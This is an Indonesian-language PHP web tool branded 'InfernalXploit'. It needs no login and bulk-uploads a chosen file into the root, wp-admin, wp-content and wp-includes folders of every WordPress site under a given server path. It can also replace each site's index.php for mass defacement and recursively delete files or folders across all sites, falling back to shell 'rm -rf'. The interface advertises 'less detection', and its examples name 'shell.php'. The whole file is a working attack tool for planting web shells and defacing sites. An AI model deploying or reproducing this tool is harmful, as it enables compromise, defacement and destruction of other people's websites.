<?php
// ---------------------------
// InfernalXploit - SUPER ROBUST UPLOADER & DELETER
// ---------------------------

// Tampilkan semua error
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

// Default values
$result = "";
$domainList = [];
$target_folder = rtrim($_POST['target_path'] ?? '', '/');

// Ambil daftar domain
if (!empty($target_folder) && is_dir($target_folder)) {
    $items = scandir($target_folder);
    foreach ($items as $item) {
        if ($item !== '.' && $item !== '..' && is_dir($target_folder . '/' . $item)) {
            $domainList[] = $item;
        }
    }
}

// Fungsi untuk upload file dengan multiple methods
function uploadFileWithMethods($source, $destination) {
    $methods = [];
    
    // Method 1: copy (paling reliable)
    if (@copy($source, $destination)) {
        $methods[] = "copy";
        @chmod($destination, 0644);
        return ['success' => true, 'method' => 'copy'];
    }
    
    // Method 2: file_put_contents
    $content = @file_get_contents($source);
    if ($content !== false && @file_put_contents($destination, $content) !== false) {
        $methods[] = "file_put_contents";
        @chmod($destination, 0644);
        return ['success' => true, 'method' => 'file_put_contents'];
    }
    
    // Method 3: fopen/fwrite
    $src = @fopen($source, 'rb');
    $dst = @fopen($destination, 'wb');
    if ($src && $dst) {
        while (!feof($src)) {
            $buffer = fread($src, 8192);
            fwrite($dst, $buffer);
        }
        fclose($src);
        fclose($dst);
        @chmod($destination, 0644);
        $methods[] = "fopen_fwrite";
        return ['success' => true, 'method' => 'fopen_fwrite'];
    }
    
    // Method 4: move_uploaded_file (khusus untuk uploaded files)
    if (is_uploaded_file($source)) {
        if (@move_uploaded_file($source, $destination)) {
            $methods[] = "move_uploaded_file";
            @chmod($destination, 0644);
            return ['success' => true, 'method' => 'move_uploaded_file'];
        }
    }
    
    // Method 5: system copy (last resort)
    if (function_exists('system')) {
        $source_escaped = escapeshellarg($source);
        $dest_escaped = escapeshellarg($destination);
        @system("cp $source_escaped $dest_escaped 2>/dev/null");
        if (file_exists($destination)) {
            @chmod($destination, 0644);
            return ['success' => true, 'method' => 'system_cp'];
        }
    }
    
    return ['success' => false, 'methods_tried' => $methods];
}

// Fungsi untuk upload otomatis ke domain (deteksi folder)
function uploadToDomain($target_folder, $domain, $tmp_name, $filename) {
    $domain_path = $target_folder . '/' . $domain;
    $success_count = 0;
    $fail_count = 0;
    $log_content = "";
    
    // Cek jika ada public_html
    $public_html_path = $domain_path . '/public_html';
    if (is_dir($public_html_path)) {
        // Upload ke public_html dan folder WordPress utama SAJA
        $target_folders = [
            "public_html",
            "public_html/wp-admin",
            "public_html/wp-content", 
            "public_html/wp-includes"
        ];
    } else {
        // Upload langsung ke root domain dan folder WordPress utama SAJA
        $target_folders = [
            "",
            "wp-admin",
            "wp-content", 
            "wp-includes"
        ];
    }
    
    foreach ($target_folders as $folder) {
        $full_path = $domain_path . '/' . $folder;
        $file_path = $full_path . '/' . $filename;
        
        // Buat folder jika tidak ada
        if (!is_dir($full_path)) {
            if (!mkdir($full_path, 0755, true)) {
                $log_content .= "❌ Gagal buat folder: " . htmlspecialchars($full_path) . "<br>";
                $fail_count++;
                continue;
            }
        }
        
        // Upload file
        $upload_result = uploadFileWithMethods($tmp_name, $file_path);
        
        if ($upload_result['success']) {
            $log_content .= "✅ " . htmlspecialchars($file_path) . " <small>(method: {$upload_result['method']})</small><br>";
            $success_count++;
        } else {
            $log_content .= "❌ Gagal: " . htmlspecialchars($file_path) . "<br>";
            $fail_count++;
        }
    }
    
    return [
        'success_count' => $success_count,
        'fail_count' => $fail_count,
        'log_content' => $log_content
    ];
}

// Fungsi untuk upload index.php khusus
function uploadIndexFile($target_folder, $domain, $tmp_name) {
    $domain_path = $target_folder . '/' . $domain;
    $success_count = 0;
    $fail_count = 0;
    $log_content = "";
    
    // Tentukan path index.php
    $public_html_path = $domain_path . '/public_html';
    if (is_dir($public_html_path)) {
        $index_path = $public_html_path . '/index.php';
    } else {
        $index_path = $domain_path . '/index.php';
    }
    
    // Backup index.php lama jika ada
    if (file_exists($index_path)) {
        $backup_path = $index_path . '.backup-' . date('Y-m-d-His');
        if (@copy($index_path, $backup_path)) {
            $log_content .= "📦 Backup created: " . htmlspecialchars($backup_path) . "<br>";
        }
    }
    
    // Upload file index.php baru
    $upload_result = uploadFileWithMethods($tmp_name, $index_path);
    
    if ($upload_result['success']) {
        $log_content .= "✅ INDEX UPDATED: " . htmlspecialchars($index_path) . " <small>(method: {$upload_result['method']})</small><br>";
        $success_count++;
    } else {
        $log_content .= "❌ Gagal update index: " . htmlspecialchars($index_path) . "<br>";
        $fail_count++;
    }
    
    return [
        'success_count' => $success_count,
        'fail_count' => $fail_count,
        'log_content' => $log_content
    ];
}

// Fungsi untuk delete file
function deleteFile($file_path) {
    if (file_exists($file_path)) {
        if (@unlink($file_path)) {
            return ['success' => true, 'method' => 'unlink'];
        }
        
        // Alternative method: system command
        if (function_exists('system')) {
            $file_escaped = escapeshellarg($file_path);
            @system("rm -f $file_escaped 2>/dev/null");
            if (!file_exists($file_path)) {
                return ['success' => true, 'method' => 'system_rm'];
            }
        }
        
        return ['success' => false];
    }
    return ['success' => true, 'method' => 'not_exists'];
}

// Fungsi untuk delete folder recursive
function deleteFolder($folder_path) {
    if (!is_dir($folder_path)) {
        return ['success' => true, 'method' => 'not_exists'];
    }
    
    // Method 1: rmdir recursive
    $files = array_diff(scandir($folder_path), ['.', '..']);
    foreach ($files as $file) {
        $path = $folder_path . '/' . $file;
        if (is_dir($path)) {
            deleteFolder($path);
        } else {
            @unlink($path);
        }
    }
    
    if (@rmdir($folder_path)) {
        return ['success' => true, 'method' => 'rmdir'];
    }
    
    // Method 2: system command
    if (function_exists('system')) {
        $folder_escaped = escapeshellarg($folder_path);
        @system("rm -rf $folder_escaped 2>/dev/null");
        if (!is_dir($folder_path)) {
            return ['success' => true, 'method' => 'system_rmrf'];
        }
    }
    
    return ['success' => false];
}

// Fungsi untuk delete file/folder dari domain
function deleteFromDomain($target_folder, $domain, $target_name, $delete_type) {
    $domain_path = $target_folder . '/' . $domain;
    $success_count = 0;
    $fail_count = 0;
    $log_content = "";
    
    // Target folders untuk pencarian - HANYA folder WordPress utama
    $search_folders = [];
    $public_html_path = $domain_path . '/public_html';
    
    if (is_dir($public_html_path)) {
        $search_folders = [
            "public_html",
            "public_html/wp-admin",
            "public_html/wp-content", 
            "public_html/wp-includes"
        ];
    } else {
        $search_folders = [
            "",
            "wp-admin",
            "wp-content", 
            "wp-includes"
        ];
    }
    
    foreach ($search_folders as $folder) {
        $full_path = $domain_path . '/' . $folder;
        $target_path = $full_path . '/' . $target_name;
        
        if ($delete_type === 'file') {
            // Delete file
            $delete_result = deleteFile($target_path);
        } else {
            // Delete folder
            $delete_result = deleteFolder($target_path);
        }
        
        if ($delete_result['success']) {
            if ($delete_result['method'] !== 'not_exists') {
                $log_content .= "✅ DELETED: " . htmlspecialchars($target_path) . " <small>(method: {$delete_result['method']})</small><br>";
                $success_count++;
            }
        } else {
            $log_content .= "❌ Gagal delete: " . htmlspecialchars($target_path) . "<br>";
            $fail_count++;
        }
    }
    
    return [
        'success_count' => $success_count,
        'fail_count' => $fail_count,
        'log_content' => $log_content
    ];
}

// Proses upload
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    if (empty($target_folder) || !is_dir($target_folder)) {
        $result = "<div class='log error'>❌ Path tidak valid: " . htmlspecialchars($target_folder) . "</div>";
    } else {
        $action_type = $_POST['action_type'] ?? 'upload';
        
        if ($action_type === 'upload') {
            // PROCESS UPLOAD
            $file = $_FILES['upload_file'] ?? null;
            $allow_zero = isset($_POST['allow_zero']) && $_POST['allow_zero'] === '1';
            $upload_type = $_POST['upload_type'] ?? 'domain';
            
            // Validasi file
            if (!$file || $file['error'] === UPLOAD_ERR_NO_FILE) {
                $result = "<div class='log error'>❌ Tidak ada file dipilih.</div>";
            } elseif ($file['error'] !== UPLOAD_ERR_OK) {
                $error_msg = [
                    UPLOAD_ERR_INI_SIZE => 'File terlalu besar (melebihi upload_max_filesize)',
                    UPLOAD_ERR_FORM_SIZE => 'File terlalu besar (melebihi MAX_FILE_SIZE form)',
                    UPLOAD_ERR_PARTIAL => 'File hanya terupload sebagian',
                    UPLOAD_ERR_NO_TMP_DIR => 'Folder temporary tidak ada',
                    UPLOAD_ERR_CANT_WRITE => 'Gagal menulis file ke disk',
                    UPLOAD_ERR_EXTENSION => 'Upload dihentikan oleh extension PHP'
                ];
                $result = "<div class='log error'>❌ Error upload: " . ($error_msg[$file['error']] ?? 'Unknown error') . "</div>";
            } else {
                $tmp_name = $file['tmp_name'];
                $filename = basename($file['name']);
                $file_size = filesize($tmp_name);
                
                // Handle file 0KB
                if ($file_size === 0 && $allow_zero) {
                    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
                    $placeholder_content = "<?php\n// INFERNALXPLOIT PLACEHOLDER\n// File: $filename\n// Time: " . date('Y-m-d H:i:s') . "\necho 'File $filename aktif!';\n?>";
                    file_put_contents($tmp_name, $placeholder_content);
                    $file_size = filesize($tmp_name);
                }
                
                if ($file_size === 0) {
                    $result = "<div class='log error'>❌ File kosong (0KB). Centang 'Izinkan file 0KB' untuk bypass.</div>";
                } else {
                    $success_count = 0;
                    $fail_count = 0;
                    $log_content = "<div class='log success'><b>🚀 PROSES UPLOAD MULAI</b><br>";
                    $log_content .= "<b>📋 TIPE UPLOAD:</b> " . ($upload_type === 'index' ? 'INDEX.PHP REPLACEMENT' : 'DOMAIN UPLOAD') . "<br><br>";
                    
                    foreach ($domainList as $domain) {
                        $domain_success = 0;
                        $domain_fail = 0;
                        $domain_log = "";
                        
                        if ($upload_type === 'index') {
                            // Upload index.php khusus
                            $upload_result = uploadIndexFile($target_folder, $domain, $tmp_name);
                        } else {
                            // Upload biasa ke domain
                            $upload_result = uploadToDomain($target_folder, $domain, $tmp_name, $filename);
                        }
                        
                        $domain_success = $upload_result['success_count'];
                        $domain_fail = $upload_result['fail_count'];
                        $domain_log = $upload_result['log_content'];
                        
                        // Tampilkan log per domain
                        if ($domain_success > 0 || $domain_fail > 0) {
                            $log_content .= "<b>🌐 DOMAIN: " . htmlspecialchars($domain) . "</b><br>";
                            $log_content .= $domain_log;
                            $log_content .= "<small>Hasil: {$domain_success} sukses, {$domain_fail} gagal</small><br><br>";
                        }
                        
                        $success_count += $domain_success;
                        $fail_count += $domain_fail;
                    }
                    
                    // Summary
                    $log_content .= "<hr><b>📊 SUMMARY FINAL:</b><br>";
                    $log_content .= "✅ Total BERHASIL: <b>$success_count file</b><br>";
                    $log_content .= "❌ Total GAGAL: <b>$fail_count file</b><br>";
                    $log_content .= "📁 Domain diproses: <b>" . count($domainList) . "</b><br>";
                    $log_content .= "💾 Ukuran file: <b>" . number_format($file_size) . " bytes</b><br>";
                    $log_content .= "🎯 Success rate: <b>" . ($success_count > 0 ? round(($success_count/($success_count+$fail_count))*100, 2) : 0) . "%</b>";
                    $log_content .= "</div>";
                    
                    $result = $log_content;
                }
            }
        } elseif ($action_type === 'delete') {
            // PROCESS DELETE
            $target_name = trim($_POST['delete_target'] ?? '');
            $delete_type = $_POST['delete_type'] ?? 'file';
            
            if (empty($target_name)) {
                $result = "<div class='log error'>❌ Nama file/folder tidak boleh kosong.</div>";
            } else {
                $success_count = 0;
                $fail_count = 0;
                $log_content = "<div class='log success'><b>🗑️ PROSES DELETE MULAI</b><br>";
                $log_content .= "<b>📋 TARGET:</b> " . htmlspecialchars($target_name) . " <small>($delete_type)</small><br><br>";
                
                foreach ($domainList as $domain) {
                    $delete_result = deleteFromDomain($target_folder, $domain, $target_name, $delete_type);
                    
                    $domain_success = $delete_result['success_count'];
                    $domain_fail = $delete_result['fail_count'];
                    $domain_log = $delete_result['log_content'];
                    
                    // Tampilkan log per domain
                    if ($domain_success > 0 || $domain_fail > 0) {
                        $log_content .= "<b>🌐 DOMAIN: " . htmlspecialchars($domain) . "</b><br>";
                        $log_content .= $domain_log;
                        $log_content .= "<small>Hasil: {$domain_success} sukses, {$domain_fail} gagal</small><br><br>";
                    }
                    
                    $success_count += $domain_success;
                    $fail_count += $domain_fail;
                }
                
                // Summary
                $log_content .= "<hr><b>📊 SUMMARY FINAL:</b><br>";
                $log_content .= "✅ Total BERHASIL: <b>$success_count delete</b><br>";
                $log_content .= "❌ Total GAGAL: <b>$fail_count delete</b><br>";
                $log_content .= "📁 Domain diproses: <b>" . count($domainList) . "</b><br>";
                $log_content .= "🎯 Success rate: <b>" . ($success_count > 0 ? round(($success_count/($success_count+$fail_count))*100, 2) : 0) . "%</b>";
                $log_content .= "</div>";
                
                $result = $log_content;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <title>InfernalXploit - WORDPRESS UPLOADER & DELETER</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; color:#fff; font-family:'Segoe UI',Arial,sans-serif; padding:20px; line-height:1.6; }
    .container { max-width:1200px; margin:0 auto; }
    header { text-align:center; padding:20px 0; border-bottom:2px solid #ff4444; margin-bottom:30px; }
    h1 { color:#ff4444; font-size:2.5em; text-shadow:0 0 10px rgba(255,68,68,0.5); }
    .subtitle { color:#00ff88; font-size:1.1em; margin-top:5px; }
    
    .action-tabs { display:flex; margin-bottom:20px; background:#111; border-radius:10px; padding:5px; }
    .action-tab { flex:1; text-align:center; padding:15px; cursor:pointer; border-radius:8px; transition:all 0.3s; }
    .action-tab.active { background:#ff4444; color:white; }
    
    .upload-form { background:rgba(30,30,30,0.9); padding:25px; border-radius:15px; border:1px solid #333; margin-bottom:30px; }
    .form-group { margin-bottom:20px; }
    label { display:block; margin-bottom:8px; color:#00ff88; font-weight:bold; }
    input[type="text"], input[type="file"], select { width:100%; padding:12px; background:#111; border:2px solid #333; border-radius:8px; color:#fff; font-size:14px; }
    input[type="text"]:focus, input[type="file"]:focus, select:focus { border-color:#00ff88; outline:none; }
    .checkbox-group { display:flex; align-items:center; gap:10px; }
    input[type="checkbox"] { width:18px; height:18px; }
    
    .btn-upload { background:linear-gradient(45deg, #ff4444, #ff0066); color:white; border:none; padding:15px 30px; font-size:18px; font-weight:bold; border-radius:10px; cursor:pointer; width:100%; transition:all 0.3s; }
    .btn-upload:hover { background:linear-gradient(45deg, #ff0066, #ff4444); transform:translateY(-2px); box-shadow:0 5px 15px rgba(255,68,68,0.4); }
    
    .btn-delete { background:linear-gradient(45deg, #ff4444, #cc0000); color:white; border:none; padding:15px 30px; font-size:18px; font-weight:bold; border-radius:10px; cursor:pointer; width:100%; transition:all 0.3s; }
    .btn-delete:hover { background:linear-gradient(45deg, #cc0000, #ff4444); transform:translateY(-2px); box-shadow:0 5px 15px rgba(255,68,68,0.4); }
    
    .log { padding:20px; border-radius:10px; margin:20px 0; }
    .log.success { background:rgba(0,255,136,0.1); border-left:5px solid #00ff88; }
    .log.error { background:rgba(255,68,68,0.1); border-left:5px solid #ff4444; }
    
    .domain-list { display:grid; grid-template-columns:repeat(auto-fill, minmax(200px, 1fr)); gap:10px; margin:15px 0; }
    .domain-item { background:rgba(255,255,255,0.1); padding:10px; border-radius:5px; text-align:center; }
    
    .info-box { background:rgba(0,255,255,0.1); border-left:5px solid #00ffff; padding:15px; margin:15px 0; border-radius:5px; }
    
    small { color:#888; }
    hr { border:none; border-top:1px solid #333; margin:15px 0; }
    
    .upload-type-selector { display:flex; gap:15px; margin-bottom:20px; }
    .upload-type-option { flex:1; text-align:center; padding:15px; background:#111; border:2px solid #333; border-radius:8px; cursor:pointer; transition:all 0.3s; }
    .upload-type-option.active { border-color:#00ff88; background:rgba(0,255,136,0.1); }
    .upload-type-option:hover { border-color:#00ff88; }
    
    .delete-form { display:none; }
    
    .target-info { background:rgba(255,193,7,0.1); border-left:5px solid #ffc107; padding:15px; margin:15px 0; border-radius:5px; }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>🔥 INFERNALXPLOIT</h1>
      <div class="subtitle">WORDPRESS FOCUS - UPLOADER & MASS DELETE</div>
    </header>
    
    <div class="target-info">
      <b>🎯 TARGET FOLDERS:</b><br>
      • public_html/ (root)<br>
      • wp-admin/<br>
      • wp-content/<br>
      • wp-includes/<br>
      <small>Hanya folder WordPress utama yang akan diproses</small>
    </div>
    
    <div class="action-tabs">
      <div class="action-tab active" data-tab="upload">📁 UPLOAD FILE</div>
      <div class="action-tab" data-tab="delete">🗑️ DELETE FILE/FOLDER</div>
    </div>
    
    <!-- UPLOAD FORM -->
    <form method="POST" enctype="multipart/form-data" class="upload-form" id="uploadForm">
      <input type="hidden" name="action_type" value="upload">
      
      <div class="form-group">
        <label>📂 Path Folder Domains:</label>
        <input type="text" name="target_path" value="<?= htmlspecialchars($target_folder) ?>" 
               placeholder="Contoh: /home/username/domains atau /var/www" required>
      </div>
      
      <div class="form-group">
        <label>🎯 Tipe Upload:</label>
        <select name="upload_type" id="upload_type">
          <option value="domain">📁 Upload ke WordPress Folders</option>
          <option value="index">📄 Upload Index.php (Replace index utama)</option>
        </select>
      </div>
      
      <div class="form-group">
        <label>📁 Pilih File untuk Upload:</label>
        <input type="file" name="upload_file" id="upload_file" required>
      </div>
      
      <div class="form-group">
        <div class="checkbox-group">
          <input type="checkbox" name="allow_zero" value="1" id="allow_zero">
          <label for="allow_zero">Izinkan file 0KB (auto placeholder)</label>
        </div>
      </div>
      
      <button type="submit" name="process" class="btn-upload" id="uploadButton">
        🚀 UPLOAD KE WORDPRESS FOLDERS
      </button>
    </form>
    
    <!-- DELETE FORM -->
    <form method="POST" class="upload-form delete-form" id="deleteForm">
      <input type="hidden" name="action_type" value="delete">
      
      <div class="form-group">
        <label>📂 Path Folder Domains:</label>
        <input type="text" name="target_path" value="<?= htmlspecialchars($target_folder) ?>" 
               placeholder="Contoh: /home/username/domains atau /var/www" required>
      </div>
      
      <div class="form-group">
        <label>🎯 Tipe Delete:</label>
        <select name="delete_type" id="delete_type">
          <option value="file">📄 Delete File</option>
          <option value="folder">📁 Delete Folder</option>
        </select>
      </div>
      
      <div class="form-group">
        <label>🗑️ Nama File/Folder yang akan dihapus:</label>
        <input type="text" name="delete_target" placeholder="Contoh: shell.php, malware.txt, badfolder" required>
      </div>
      
      <button type="submit" name="process" class="btn-delete">
        💥 DELETE DARI WORDPRESS FOLDERS
      </button>
    </form>
    
    <?php if (!empty($domainList)): ?>
    <div class="log success">
      <b>📑 DOMAIN YANG AKAN DIPROSES:</b>
      <div class="domain-list">
        <?php foreach ($domainList as $domain): ?>
          <div class="domain-item"><?= htmlspecialchars($domain) ?></div>
        <?php endforeach; ?>
      </div>
      <small>Total: <?= count($domainList) ?> domain ditemukan</small>
    </div>
    <?php elseif (!empty($target_folder)): ?>
    <div class="log error">
      ❌ Tidak ditemukan domain di: <?= htmlspecialchars($target_folder) ?>
    </div>
    <?php endif; ?>
    
    <?= $result ?>
    
    <div class="info-box">
      <b>💡 FITUR TERBARU - WORDPRESS FOCUS:</b><br>
      <b>📁 UPLOAD MODE:</b><br>
      - WordPress Upload: Upload ke folder WordPress utama saja<br>
      - Index Replacement: Ganti index.php + auto backup<br><br>
      
      <b>🗑️ DELETE MODE:</b><br>
      - Mass Delete File: Hapus file dari folder WordPress<br>
      - Mass Delete Folder: Hapus folder recursive dari WordPress<br>
      - Target: public_html, wp-admin, wp-content, wp-includes<br><br>
      
      <b>🎯 KEUNGGULAN:</b><br>
      - Lebih fokus dan cepat (hanya 4 folder utama)<br>
      - Optimal untuk target WordPress<br>
      - Less detection, more efficient<br>
      - Backup otomatis untuk index.php
    </div>
  </div>

  <script>
    // Tab switching
    document.querySelectorAll('.action-tab').forEach(tab => {
        tab.addEventListener('click', function() {
            // Update tabs
            document.querySelectorAll('.action-tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            
            // Show/hide forms
            const tabName = this.getAttribute('data-tab');
            document.getElementById('uploadForm').style.display = tabName === 'upload' ? 'block' : 'none';
            document.getElementById('deleteForm').style.display = tabName === 'delete' ? 'block' : 'none';
        });
    });
    
    // Update button text based on upload type
    document.getElementById('upload_type').addEventListener('change', function() {
        const button = document.getElementById('uploadButton');
        if (this.value === 'index') {
            button.innerHTML = '🚀 REPLACE INDEX.PHP DI SEMUA DOMAIN';
        } else {
            button.innerHTML = '🚀 UPLOAD KE WORDPRESS FOLDERS';
        }
    });
    
    // Update delete button text based on delete type
    document.getElementById('delete_type').addEventListener('change', function() {
        const button = document.querySelector('.btn-delete');
        if (this.value === 'folder') {
            button.innerHTML = '💥 DELETE FOLDER DARI WORDPRESS';
        } else {
            button.innerHTML = '💥 DELETE FILE DARI WORDPRESS';
        }
    });
  </script>
</body>
</html>